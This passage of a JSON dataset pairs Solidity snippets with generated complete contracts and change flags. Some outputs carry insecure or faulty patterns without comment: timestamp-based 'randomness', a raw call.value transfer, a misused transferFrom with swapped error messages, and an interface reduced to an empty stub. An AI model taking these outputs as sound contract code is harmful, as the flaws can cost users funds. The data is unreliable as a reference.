        "output": "pragma solidity ^0.8.9;\nlibrary UIntFunctions {\n    function isEven(uint self) internal pure returns(bool) {\n        if (self % 2 == 0) {\n            return true;\n        }\n        return false;\n    }\n}\n\ncontract Game {\n    using UIntFunctions for uint;\n    uint public participants;\n    bool public allowTeams;\n\n    constructor(uint _participants) public {\n        participants = _participants;\n        allowTeams = _participants.isEven();\n    }\n\n    function updateParticipants(uint _participants) public {\n        participants = _participants;\n        allowTeams = _participants.isEven();\n    }\n\n    function getAllowTeams() public view returns(bool) {\n        return allowTeams;\n    }\n}\n\n",
        "changed": 0
    },
    "181.sol": {
        "input": "receive() external payable {}\n\nconstructor(address _tradeToken, uint initialFee, uint256 initalMaxBet, uint256 initalMinBet) public payable {\n    fee = initialFee;\n    maxBet = initalMaxBet;\n    minBet = initalMinBet;\n    owner = msg.sender;\n    token = IERC20(_tradeToken);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "182.sol": {
        "input": "spool = ISpool(address(0x123));\nbool result = spool.foo(1);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ISpool {\n    function foo(uint256 _id) external returns (bool);\n}\n\ncontract MainContract {\n    ISpool public spool;\n\n    // Constructor\n    constructor() public {\n        // Initialize spool with the given address\n        spool = ISpool(address(0x123));\n    }\n\n    // Function to call foo function of ISpool\n    function callFoo(uint256 _id) public returns (bool) {\n        bool result = spool.foo(_id);\n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "183.sol": {
        "input": "require(\n  ECDSA.recover(ethSignedMessageHash, _signature) == signer,\n  \"invalid signature\"\n);\n\n\n",
        "output": "",
        "changed": 0
    },
    "184.sol": {
        "input": "function getUnitSum() public view returns (uint) {\n    uint sum;\n\n    for (uint i = 0; i < details.length; i++) {\n        sum += details[i].Unit;\n    }\n\n    return sum;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UnitSum {\n    struct Detail {\n        uint Unit;\n    }\n\n    Detail[] public details;\n\n    function addDetail(uint _unit) public {\n        Detail memory newDetail = Detail({\n            Unit: _unit\n        });\n\n        details.push(newDetail);\n    }\n\n    function getUnitSum() public view returns (uint) {\n        uint sum;\n\n        for (uint i = 0; i < details.length; i++) {\n            sum += details[i].Unit;\n        }\n\n        return sum;\n    }\n}\n\n",
        "changed": 1
    },
    "185.sol": {
        "input": "function decode(bytes memory data) private pure returns(bytes4 selector, uint productAmount, bytes3 color) {\n    assembly {\n      selector := mload(add(data, 32))\n      productAmount := mload(add(data, 64))\n      color := mload(add(data, 96))\n    }\n}\n\n(bytes4 selector, uint productAmount, bytes3 color) =\n  decode(data);\n\nbytes memory funcData =\n  abi.encodeWithSelector(selector, sender, tokensPaid, productAmount, color);\n\n(bool success,) = address(this).call(funcData);\nrequire(success, \"call failed\");\n\nif (selector == this.buy.selector) {\n    buy(sender, tokensPaid, productAmount, color);\n}\n\nfunction onTransferReceived(address operator, address sender, uint256 tokensPaid, bytes calldata data) external override (IERC1363Receiver) returns (bytes4) {\n    require(msg.sender == address(acceptedToken), \"I accept purchases in Payable Tokens\");\n\u200b\n    (bytes4 selector, uint productAmount, bytes3 color) =\n        decode(data);\n\u200b\n    if (selector == this.buy.selector) {\n      buy(sender, tokensPaid, productAmount, color);\n    }\n\u200b\n    return this.onTransferReceived.selector;\n  }\n\n\n",
        "output": "",
        "changed": 0
    },
    "186.sol": {
        "input": "function random() view public returns (uint)\n\u00a0\u00a0\u00a0\u00a0{\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0uint answer = block.timestamp% 10 ;\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return answer;\n\u00a0\u00a0\u00a0\u00a0}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RandomNumber {\n    \n    // Constructor that's called when the contract is created\n    constructor() public {}\n    \n    // Function to generate random number\n    function random() view public returns (uint) {\n        uint answer = block.timestamp % 10;\n        return answer;\n    }\n}\n\n",
        "changed": 0
    },
    "188.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract ExternalContract {\n    function getValue() public {\n        revert();\n    }\n}\n\ncontract Caller {\n    address externalContractAddress;\n\n    constructor(address _externalContractAddress) {\n        externalContractAddress = _externalContractAddress;\n    }\n\n    function getExternalValueNamed() public {\n        ExternalContract(externalContractAddress).getValue();\n    }\n\n    function getExternalValueCall() public {\n        externalContractAddress.call(\n            abi.encodeWithSignature(\"getValue()\")\n        );\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract ExternalContract {\n    function getValue() public {\n        revert();\n    }\n}\n\ncontract Caller {\n    address externalContractAddress;\n\n    constructor(address _externalContractAddress) {\n        externalContractAddress = _externalContractAddress;\n    }\n\n    function getExternalValueNamed() public {\n        // causes the main transaction to revert\n        ExternalContract(externalContractAddress).getValue();\n    }\n\n    function getExternalValueCall() public {\n        // does not revert the main transaction\n        externalContractAddress.call(\n            abi.encodeWithSignature(\"getValue()\")\n        );\n    }\n}\n\n\n",
        "changed": 0
    },
    "189.sol": {
        "input": "contractToken1.methods.function1().send({from: account}).on('transactionHash', (hash)=>{\ncontractToken2.methods.function2().send({from: account}).on('transactionHash',(hash)=> console.log('this was successful'));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IToken1 {\n    function function1() external;\n}\n\ninterface IToken2 {\n    function function2() external;\n}\n\ncontract MyContract {\n    IToken1 contractToken1;\n    IToken2 contractToken2;\n    address account;\n\n    constructor(address _contractToken1, address _contractToken2, address _account) {\n        contractToken1 = IToken1(_contractToken1);\n        contractToken2 = IToken2(_contractToken2);\n        account = _account;\n    }\n\n    function callFunction1() public {\n        contractToken1.function1();\n    }\n\n    function callFunction2() public {\n        contractToken2.function2();\n    }\n}\n\n",
        "changed": 0
    },
    "190.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        address recipient = address(0x123);\n        payable(recipient).transfer(1 ether);\n    }\n}\n\npragma solidity ^0.8;\n\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n\n    function foo() external payable {\n        IERC20 tokenContract = IERC20(address(0x456));\n        tokenContract.transfer(msg.sender, 1);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 private _tokenContract;\n\n    constructor(address tokenContractAddress) {\n        _tokenContract = IERC20(tokenContractAddress);\n    }\n\n    function foo() external payable {\n        require(msg.value >= 1 ether, \"Insufficient Ether sent.\");\n        _tokenContract.transfer(msg.sender, 1);\n    }\n\n    receive() external payable {}\n}\n",
        "changed": 0
    },
    "191.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract CrowdFunding {\n    struct Funder {\n        address addr;\n        uint amount;\n    }\n\n    struct Campaign {\n        address beneficiary;\n        uint fundingGoal;\n        uint numFunders;\n        uint amount;\n        mapping (uint => Funder) funders;\n    }\n\n    uint numCampaigns;\n    mapping (uint => Campaign) campaigns;\n\n    function newCampaign(address beneficiary, uint goal) public returns (uint campaignID) {\n        campaignID = numCampaigns++; \n        Campaign storage _campaign = campaigns[campaignID];\n        _campaign.beneficiary = beneficiary;\n        _campaign.fundingGoal = goal;\n        _campaign.numFunders = 0;\n        _campaign.funders[0] = Funder(msg.sender, 100);\n    }\n\n    function contribute(uint campaignID) public payable {\n        Campaign storage c = campaigns[campaignID];\n        c.funders[c.numFunders++] = Funder({addr: msg.sender, amount: msg.value});\n        c.amount += msg.value;\n    }\n\n    function checkGoalReached(uint campaignID) public returns (bool reached) {\n        Campaign storage c = campaigns[campaignID];\n        if (c.amount < c.fundingGoal)\n            return false;\n        uint amount = c.amount;\n        c.amount = 0;\n        return true;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CrowdFunding {\n    // Defines a new type with two fields.\n    struct Funder {\n        address addr;\n        uint amount;\n    }\n\n    struct Campaign {\n        address beneficiary;\n        uint fundingGoal;\n        uint numFunders;\n        uint amount;\n        mapping (uint => Funder) funders;\n    }\n\n    uint numCampaigns;\n    mapping (uint => Campaign) campaigns;\n\n    function newCampaign(address beneficiary, uint goal) public returns (uint campaignID) {\n        campaignID = numCampaigns++; // campaignID is return variable\n        // Creates new struct and saves in storage. We leave out the mapping type.\n        Campaign storage _campaign = campaigns[campaignID];\n        _campaign.beneficiary = beneficiary;\n        _campaign.fundingGoal = goal;\n        _campaign.numFunders = 0;\n        _campaign.funders[0] = Funder(msg.sender, 100);\n    }\n\n    function contribute(uint campaignID) public payable {\n        Campaign storage c = campaigns[campaignID];\n        // Creates a new temporary memory struct, initialised with the given values\n        // and copies it over to storage.\n        // Note that you can also use Funder(msg.sender, msg.value) to initialise.\n        c.funders[c.numFunders++] = Funder({addr: msg.sender, amount: msg.value});\n        c.amount += msg.value;\n    }\n\n    function checkGoalReached(uint campaignID) public returns (bool reached) {\n        Campaign storage c = campaigns[campaignID];\n        if (c.amount < c.fundingGoal)\n            return false;\n        uint amount = c.amount;\n        c.amount = 0;\n        //c.beneficiary.transfer(amount);\n        return true;\n    }\n}\n\n",
        "changed": 0
    },
    "192.sol": {
        "input": "function getScoreDifference (Game.Teams x) public view returns (int256) {\n  if (x == Game.Teams.Team1) {\n    return game.team1Score - game.team2Score;\n  } else if (x == Game.Teams.Team2) {\n    return game.team2Score - game.team1Score;\n  }\n}\n\nfunction getScoreDifference (Game.Teams x) public view returns (int256 score) {\n  if (x == Game.Teams.Team1) {\n    return score = game.team1Score() - game.team2Score();\n  } else if (x == Game.Teams.Team2) {\n    return score = game.team2Score() - game.team1Score();\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Game {\n    enum Teams {\n        Team1,\n        Team2\n    }\n\n    struct GameData {\n        int256 team1Score;\n        int256 team2Score;\n    }\n\n    GameData public game;\n\n    constructor(int256 _team1Score, int256 _team2Score) {\n        game.team1Score = _team1Score;\n        game.team2Score = _team2Score;\n    }\n\n    function getScoreDifference(Teams x) public view returns (int256) {\n        if (x == Teams.Team1) {\n            return game.team1Score - game.team2Score;\n        } else if (x == Teams.Team2) {\n            return game.team2Score - game.team1Score;\n        } else {\n            revert(\"Invalid team selection\");\n        }\n    }\n\n    function getScoreDifferenceWithReturn(Teams x) public view returns (int256 score) {\n        if (x == Teams.Team1) {\n            score = game.team1Score - game.team2Score;\n        } else if (x == Teams.Team2) {\n            score = game.team2Score - game.team1Score;\n        } else {\n            revert(\"Invalid team selection\");\n        }\n        return score;\n    }\n}\n\n",
        "changed": 0
    },
    "195.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MedicalHistory {\n    struct Patient {\n        string name;\n        uint16 age;\n    }\n\n    Patient[] _patients;\n\n    function Register(\n        string memory name,\n        uint16 age\n    ) external {\n        Patient memory patient = Patient(name, age);\n        _patients.push(patient);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MedicalHistory {\n    struct Patient {\n        string name;\n        uint16 age;\n    }\n\n    Patient[] _patients;\n\n    function Register(\n        string memory name,\n        uint16 age\n    ) external {\n        Patient memory patient = Patient(name, age);\n        _patients.push(patient);\n    }\n}\n\n",
        "changed": 0
    },
    "196.sol": {
        "input": "pragma solidity ^0.4.17;\n \ncontract helloGeeks\n{\n  int[] public numbers;\n \n  function Numbers() public\n  {\n    numbers.push(1);\n    numbers.push(2);\n \n    int[] storage myArray = numbers;\n     \n    myArray[0] = 0;\n  } \n}\n\npragma solidity ^0.4.17;\n \ncontract helloGeeks\n{ \n  int[] public numbers;\n   \n  function Numbers() public\n  {\n    numbers.push(1);\n    numbers.push(2);\n     \n    int[] memory myArray = numbers;\n     \n    myArray[0] = 0;\n  } \n}\n\nmapping(key => value) <name>;\n\ncontract helloGeeks\n{ \n  mapping(address => uint) balance;\n   \n \n  function Insert(address _user, uint _amount) public\n  {\n    balance[_user] = _amount\n  } \n\n  function View(address _user) public view returns(uint)\n  {\n    return balance[_user];\n  } \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract helloGeeks {\n    int[] public numbers;\n    mapping(address => uint) public balance;\n    \n    function Numbers() public {\n        numbers.push(1);\n        numbers.push(2);\n        \n        int[] memory myArray = numbers;\n        myArray[0] = 0;\n    } \n    \n    function Insert(address _user, uint _amount) public {\n        balance[_user] = _amount;\n    } \n\n    function View(address _user) public view returns(uint) {\n        return balance[_user];\n    } \n}\n\n",
        "changed": 0
    },
    "197.sol": {
        "input": "    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {\n        return IERC721Receiver.onERC721Received.selector;\n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "198.sol": {
        "input": "contract SimpleStorage { ... }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint data;\n\n    function set(uint x) public {\n        data = x;\n    }\n\n    function get() public view returns (uint) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "199.sol": {
        "input": "pragma solidity ^0.8;\n\nlibrary TimestampHelper {\n    uint constant SECONDS_PER_DAY = 24 * 60 * 60;\n    uint constant SECONDS_PER_HOUR = 60 * 60;\n\n    function getHour(uint timestamp) internal pure returns (uint hour) {\n        uint secs = timestamp % SECONDS_PER_DAY;\n        hour = secs / SECONDS_PER_HOUR;\n    }\n}\n\ncontract MyContract {\n    function foo() external view {\n        uint currentHour = TimestampHelper.getHour(block.timestamp);\n        require(\n            currentHour >= 8 && currentHour <= 18,\n            \"We're closed now. Opened from 8 AM to 6 PM UTC.\"\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\nlibrary TimestampHelper {\n    uint constant SECONDS_PER_DAY = 24 * 60 * 60;\n    uint constant SECONDS_PER_HOUR = 60 * 60;\n\n    function getHour(uint timestamp) internal pure returns (uint hour) {\n        uint secs = timestamp % SECONDS_PER_DAY;\n        hour = secs / SECONDS_PER_HOUR;\n    }\n}\n\ncontract MyContract {\n    function foo() external view {\n        uint currentHour = TimestampHelper.getHour(block.timestamp);\n        require(\n            currentHour >= 8 && currentHour <= 18,\n            \"We're closed now. Opened from 8 AM to 6 PM UTC.\"\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "200.sol": {
        "input": "return uint80(uint256(_phaseId) << 64 | _aggregatorRoundId);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function calculateId(uint256 _phaseId, uint256 _aggregatorRoundId) public pure returns (uint80) {\n        return uint80(uint256(_phaseId) << 64 | _aggregatorRoundId);\n    }\n}\n\n",
        "changed": 0
    },
    "201.sol": {
        "input": "\n(bool success, ) = recipient.call.value(amount)(\"\");\n\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract SendEther {\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n    function sendEther(address payable recipient, uint256 amount) public payable {\n        require(address(this).balance >= amount,\"Insufficient balance in the contract\");\n        (bool success, ) = recipient.call.value(amount)(\"\");\n        require(success, \"Transfer failed.\");\n\n        emit Transfer(msg.sender, recipient, amount);\n    }\n    \n    function deposit() public payable {\n        require(msg.value > 0, \"You need to send some ether\");\n    }\n\n    function getContractBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 1
    },
    "202.sol": {
        "input": "\npragma solidity >=0.7.0 <0.9.0;\n\ncontract Auction {\naddress payable internal auction_owner; \nuint256 public auction_start; \nuint256 public auction_end; \nuint256 public highestBid;\naddress public highestBidder;\n\nenum auction_state {\nCANCELLED, STARTED,ENDED\n}\naddress[] bidders;\n\nmapping(address => uint) public bids; \n\nauction_state public STATE;\n\n\n\nmodifier an_ongoing_auction() { require(block.timestamp <= auction_end);\n_;\n}\n\nmodifier only_owner() { require(msg.sender == auction_owner);\n_;\n}\n\nfunction MyAuction (uint _biddingTime, address payable  _owner) public {\n     auction_owner = _owner; \n     auction_start = block.timestamp;\n    auction_end = auction_start + _biddingTime* 1 minutes;\n     STATE = auction_state.STARTED;\n    if (block.timestamp>auction_end){\n        STATE=auction_state.ENDED;\n        auction_owner.transfer(highestBid);\n        bids[highestBidder]=0;\n        \n    } \n\n}\n\nfunction bid() public payable an_ongoing_auction returns (bool){ \n\n    require(bids[msg.sender] + msg.value > highestBid, \"can't bid, Make a higher Bid\" );\n\n    highestBidder = msg.sender; \n    highestBid = msg.value; \n    bidders.push(msg.sender);\n    bids[msg.sender] = bids[msg.sender] + msg.value; \n    emit BidEvent(highestBidder, highestBid);\n    return true; \n    }\n\n    \nfunction withdraw() public payable returns (bool){\n    require(block.timestamp > auction_end , \"can't withdraw, Auction is still open\");\n    uint amount= bids[msg.sender];\n    bids[msg.sender] = 0; \n    payable(msg.sender).transfer(amount); \n    emit WithdrawalEvent(msg.sender, amount);\n    return true;\n}\nfunction cancel_auction() only_owner an_ongoing_auction public returns (bool) {\n     STATE = auction_state.CANCELLED;\n    emit CanceledEvent(\"Auction Cancelled\", block.timestamp,highestBid); \n    return true;\n}\nfunction time_remain() an_ongoing_auction public view returns (uint256){\nuint256 timeleft= auction_end - block.timestamp;\nreturn timeleft; \n\n}\n\nevent BidEvent(address highestBidder, uint256 highestBid); \n\nevent WithdrawalEvent(address withdrawer, uint256 amount);\n\nevent CanceledEvent(string message, uint256 time, uint256 highestBid);\n    \n}\n\n\n\n",
        "output": "\n//SPDX-License-Identifier: Unlicense\npragma solidity >=0.7.0 <0.9.0;\n\ncontract Auction {\naddress payable internal auction_owner; \nuint256 public auction_start; \nuint256 public auction_end; \nuint256 public highestBid;\naddress public highestBidder;\n\nenum auction_state {\nCANCELLED, STARTED,ENDED\n}\naddress[] bidders;\n\nmapping(address => uint) public bids; \n\nauction_state public STATE;\n\n\n\nmodifier an_ongoing_auction() { require(block.timestamp <= auction_end);\n_;\n}\n\nmodifier only_owner() { require(msg.sender == auction_owner);\n_;\n}\n\nfunction MyAuction (uint _biddingTime, address payable  _owner) public {\n     auction_owner = _owner; \n     auction_start = block.timestamp;\n    auction_end = auction_start + _biddingTime* 1 minutes;\n     STATE = auction_state.STARTED;\n    if (block.timestamp>auction_end){\n        STATE=auction_state.ENDED;\n        auction_owner.transfer(highestBid);\n        bids[highestBidder]=0;\n        \n    } \n\n}\n\nfunction bid() public payable an_ongoing_auction returns (bool){ \n\n    require(bids[msg.sender] + msg.value > highestBid, \"can't bid, Make a higher Bid\" );\n\n    highestBidder = msg.sender; \n    highestBid = msg.value; \n    bidders.push(msg.sender);\n    bids[msg.sender] = bids[msg.sender] + msg.value; \n    emit BidEvent(highestBidder, highestBid);\n    return true; \n    }\n\n    \nfunction withdraw() public payable returns (bool){\n   // address payable rec = msg.sender;\n    require(block.timestamp > auction_end , \"can't withdraw, Auction is still open\");\n    uint amount= bids[msg.sender];\n    bids[msg.sender] = 0; \n    payable(msg.sender).transfer(amount); \n    emit WithdrawalEvent(msg.sender, amount);\n    return true;\n}\nfunction cancel_auction() only_owner an_ongoing_auction public returns (bool) {\n     STATE = auction_state.CANCELLED;\n    emit CanceledEvent(\"Auction Cancelled\", block.timestamp,highestBid); \n    return true;\n}\nfunction time_remain() an_ongoing_auction public view returns (uint256){\nuint256 timeleft= auction_end - block.timestamp;\nreturn timeleft; \n\n}\n\nevent BidEvent(address highestBidder, uint256 highestBid); \n\nevent WithdrawalEvent(address withdrawer, uint256 amount);\n\nevent CanceledEvent(string message, uint256 time, uint256 highestBid);\n    \n}\n\n\n",
        "changed": 0
    },
    "203.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint[2] stateArray1 = [1, 2];\n    uint[2] stateArray2 = [3, 4];\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint[2] stateArray1 = [1, 2];\n    uint[2] stateArray2 = [3, 4];\n}\n\n",
        "changed": 0
    },
    "204.sol": {
        "input": "pragma solidity 0.6.12;\npragma experimental ABIEncoderV2;\n\ncontract test{\n    mapping(address => address) public managers;\n\n    struct tokenInfo{\n      address token;\n      uint256 decimals;\n      uint256 amount;\n  }\n\n   struct recordInfo{\n       uint time;\n       tokenInfo[] tokens;\n   }\n   \n   mapping(address => mapping(uint => recordInfo)) public record_List;\n\n    function claim(address pool, uint idRecord) public {    \n        address manager = address(0);\n        require(managers[pool] != manager,\"claim is not manager\");\n        recordInfo storage record = record_List[pool][idRecord];\n        delete record.time;\n        delete record.tokens;\n        record.time = block.timestamp;\n        for( uint i = 0;i < 2;i++){\n            uint balance;\n            tokenInfo memory token; \n            token.token = address(0);\n            token.amount = balance;\n            token.decimals = 18;\n            record.tokens.push(token);\n        }\n        record_List[pool][2] = record;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.6.12;\n// Contracts\npragma experimental ABIEncoderV2;\n\ncontract test{\n    mapping(address => address) public managers;\n\n    struct tokenInfo{\n      address token;\n      uint256 decimals;\n      uint256 amount;\n  }\n\n   struct recordInfo{\n       uint time;\n       tokenInfo[] tokens;\n   }\n   \n   mapping(address => mapping(uint => recordInfo)) public record_List;\n\n    function claim(address pool, uint idRecord) public {    \n        address manager = address(0);\n        require(managers[pool] != manager,\"claim is not manager\");\n        // NOTE: I retrieve a specific element from record_List mapping using pool and idRecord parameters for querying the mapping\n        recordInfo storage record = record_List[pool][idRecord];\n        delete record.time;\n        delete record.tokens;\n        record.time = block.timestamp;\n        for( uint i = 0;i < 2;i++){\n            uint balance;\n            tokenInfo memory token; \n            token.token = address(0);\n            token.amount = balance;\n            token.decimals = 18;\n            record.tokens.push(token);\n        }\n        record_List[pool][2] = record;\n    }\n}\n\n",
        "changed": 0
    },
    "205.sol": {
        "input": "contract YourContract is Ownable {\n\nuint256 public maxAmount = 10;\nuint256 public price = 10 ether;\n\nfunction mint(address _to, uint256 _mintAmount) public payable {\n    require(_mintAmount > 0); \n    require(_mintAmount <= maxAmount);\n   \n    if (msg.sender != owner()) {       \n          require(msg.value >= price * _mintAmount);     \n    }\n    \n    for (uint256 i = 1; i <= _mintAmount; i++) {\n      _safeMint(_to, i);\n    }\n  }\n}\n\n function _safeMint(address to, uint256 tokenId) internal virtual {\n        _safeMint(to, tokenId, \"\");\n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "206.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract ContractA {\n    address contractB;\n    \n    modifier onlyContractB {\n        require(msg.sender == contractB);\n        _;\n    }\n\n    function foo() external onlyContractB {\n    }\n    \n    function setContractBAddress(address _contractB) external {\n        contractB = _contractB;\n    }\n}\n\npragma solidity ^0.8;\n\ninterface IContractA {\n    function foo() external;\n}\n\ncontract ContractB {\n    IContractA contractA;\n    \n    constructor(address _contractA) {\n        contractA = IContractA(_contractA);\n    }\n\n    function callFoo() external {\n        contractA.foo();\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract ContractA {\n    address contractB;\n    \n    modifier onlyContractB {\n        require(msg.sender == contractB);\n        _;\n    }\n\n    function foo() external onlyContractB {\n    }\n    \n    function setContractBAddress(address _contractB) external {\n        contractB = _contractB;\n    }\n}\n\npragma solidity ^0.8;\n\ninterface IContractA {\n    function foo() external;\n}\n\ncontract ContractB {\n    IContractA contractA;\n    \n    constructor(address _contractA) {\n        contractA = IContractA(_contractA);\n    }\n\n    function callFoo() external {\n        contractA.foo();\n    }\n\n}\n\n",
        "changed": 0
    },
    "207.sol": {
        "input": "function transferNFTtoNewOwner(NFTItem memory t,address oldOwner, address newOwner) internal {\n    require(newOwner != address(0), \"New owner can't be address zero.\");\n    XXXX storage r = creatureList[t.tokenAddress][t.tokenId];\n    IERC721 nft = IERC721(t.tokenAddress);\n    nft.safeTransferFrom(oldOwner, newOwner, t.tokenId); \n    address currOwner = nft.ownerOf(t.tokenId);\n    require(newOwner == currOwner, \"Problem on nft transfer\");\n    r.owner = newOwner; \n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "208.sol": {
        "input": "payable(buyer).transfer(msg.value);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    address payable public seller;\n    address payable public buyer;\n\n    constructor(address payable _buyer) {\n        seller = payable(msg.sender);\n        buyer = _buyer;\n    }\n    \n    function buy() public payable {\n        require(msg.sender == buyer, \"Only the buyer can buy.\");\n        payable(buyer).transfer(msg.value);\n    }\n}\n\n",
        "changed": 0
    },
    "209.sol": {
        "input": "interface IPancakeswapV2Router02 is IPancakeswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IPancakeswapV2Router01 {\n    // define the necessary functions or methods for the interface\n}\n\n",
        "changed": 1
    },
    "210.sol": {
        "input": "_token.transferFrom(address(this), msg.sender, amountToken );\n\n_token.transfer( msg.sender, amountToken );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 private _token;\n    address private _owner;\n\n    constructor(IERC20 token) public {\n        _token = token;\n        _owner = msg.sender;\n    }\n\n    function transferFromContract(uint256 amountToken) public {\n        require(_token.transferFrom(address(this), msg.sender, amountToken), \"Transfer from contract failed.\");\n    }\n\n    function transferToContract(uint256 amountToken) public {\n        require(_token.transfer(msg.sender, amountToken), \"Transfer to contract failed.\");\n    }\n}\n\n",
        "changed": 1
    },
    "211.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Escrow {\n    \n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    function depositNothing() public view {\n        require(msg.sender == owner, 'You are not the owner!');\n    }\n    \n    function balanceOf() view public returns(uint) {\n        return address(this).balance;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.0;\n\ncontract Escrow {\n    \n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    function depositNothing() public view {\n        require(msg.sender == owner, 'You are not the owner!');\n    }\n    \n    function balanceOf() view public returns(uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "212.sol": {
        "input": "bytes b = ...;\nuint256 num = uint256(bytes32(b));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ConvertBytes {\n    bytes b;\n    uint256 num;\n\n    constructor(bytes memory _b) public {\n        b = _b;\n        num = uint256(bytesToBytes32(_b));\n    }\n\n    function bytesToBytes32(bytes memory source) private pure returns (bytes32 result) {\n        if (source.length != 32) {\n            return 0;\n        }\n        assembly {\n            result := mload(add(source, 0x20))\n        }\n    }\n\n    function getNum() public view returns (uint256) {\n        return num;\n    }\n}\n\n",
        "changed": 0
    },
    "213.sol": {
        "input": "pragma solidity 0.5.8;\n\ninterface ITokenDeposit {}\n\ninterface trcToken {}\n\ncontract CWC is ITokenDeposit {\n  string public name = \"Decentralized CWC\";\n  string public symbol = \"CWC\";\n  uint8  public decimals = 18;\n  trcToken  public usddTokenId = trcToken(1004777);\n}\n\n\n",
        "output": "pragma solidity 0.5.8;\n\ninterface ITokenDeposit {}\n\ninterface trcToken {}\n\ncontract CWC is ITokenDeposit {\n  //using SafeMath for uint256;\n  string public name = \"Decentralized CWC\";\n  string public symbol = \"CWC\";\n  uint8  public decimals = 18;\n  trcToken  public usddTokenId = trcToken(1004777);\n}\n\n",
        "changed": 0
    },
    "214.sol": {
        "input": "   let messageHash = keccak256(utils.toUtf8Bytes(message));\n\n    let messageHash = ethers.utils.solidityKeccak256(['string'], [message]);\n\n    let signature = await address0.signMessage(messageHash);\n\n     let signature = await address0.signMessage(ethers.utils.arrayify(messageHash));\n\nusing ECDSA for bytes32; \n\nfunction verifyMessage(string memory message, bytes memory signature) public view  returns(address, bool) {\n        bytes32 messagehash =  keccak256(bytes(message));\n       \n        address signeraddress = messagehash.toEthSignedMessageHash().recover(signature);\n              \n        if (msg.sender==signeraddress) {\n            return (signeraddress, true);\n        } else {\n            return (signeraddress, false);\n        }\n    }\n  \n\n    \n\n\n",
        "output": "",
        "changed": 0
    },
    "215.sol": {
